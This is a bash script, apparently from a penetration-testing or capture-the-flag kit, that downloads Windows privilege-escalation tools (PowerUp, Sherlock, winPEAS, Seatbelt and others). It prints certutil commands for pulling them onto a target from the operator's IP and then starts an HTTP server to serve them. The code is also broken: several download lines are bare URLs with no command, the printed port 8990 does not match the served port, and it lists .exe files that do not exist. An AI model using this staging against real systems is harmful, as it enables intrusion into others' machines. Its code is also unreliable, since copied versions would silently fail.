#!/bin/bash

if [ $# != 2 ]; then
  echo "Usage: $0 <LHOST/INTERFACE> <LPORT>"
  echo ""
  echo "Example: $0 10.10.14.12 80"
  echo "Example: $0 tun0 8080"
  echo "Example: $0 tun0 random"
  echo ""
  exit 1
fi

ip=$1
ip_length=$(echo $ip | wc -c)
if [ $ip_length -le 5 ]; then
  ip=$(ip addr | grep $ip | grep inet | tr -s " " | cut -d " " -f 3 | cut -d "/" -f 1)
  if [ ! $ip ]; then
    echo "Selected interface doesn't have IP address."
    exit 1
  fi
fi

port=$2
if [ $port == random ]; then
  port=$((1024 + RANDOM % 50000))
fi

if [ ! -f "PowerUp.ps1" ]; then
  wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
fi

if [ ! -f "Sherlock.ps1" ]; then
  wget https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1
fi

if [ ! -f "jaws-enum.ps1" ]; then
  wget https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1
fi

if [ ! -f "windows-exploit-suggester.py" ]; then
  wget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py
fi

if [ ! -f "Seatbelt.exe" ]; then
  wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe
fi

if [ ! -f "SharpUp.exe" ]; then
  https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpUp.exe
fi

if [ ! -f "Accesschk.exe" ]; then
  https://xor.cat/assets/other/Accesschk.zip
  unzip Accesschk.zip
fi

if [ ! -f "winPEASany.exe" ]; then
  https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/winPEAS/bin/Obfuscated%20Releases/winPEASany.exe
fi

if [ ! -f "Watson.exe" ]; then
  https://github.com/4ndygu/precompiled-watsons/raw/master/Watson.exe
fi

echo ""
echo "You can download any of these tools to your target linux machine using commands below:"
echo ""
echo "certutil.exe -urlcache -split -f http://$ip:8990/accesschk.exe accesschk.exe"
echo "certutil.exe -urlcache -split -f http://$ip:8990/winPEASany.exe winPEASany.exe"
echo "certutil.exe -urlcache -split -f http://$ip:8990/Seatbelt.exe Seatbelt.exe"
echo "certutil.exe -urlcache -split -f http://$ip:8990/SharpUp.exe SharpUp.exe"
echo "certutil.exe -urlcache -split -f http://$ip:8990/PowerUp.exe PowerUp.exe"
echo "certutil.exe -urlcache -split -f http://$ip:8990/Sherlock.exe Sherlock.exe"
echo "certutil.exe -urlcache -split -f http://$ip:8990/Watson.exe Watson.exe"
echo "certutil.exe -urlcache -split -f http://$ip:8990/jaws-enum.exe jaws-enum.exe"
echo ""

if [ $port -lt 1024 ]; then
  echo "Port is less than 1024, you need to provide your sudo password..."
  sudo python3 -m http.server $port
else
  python3 -m http.server $port
fi
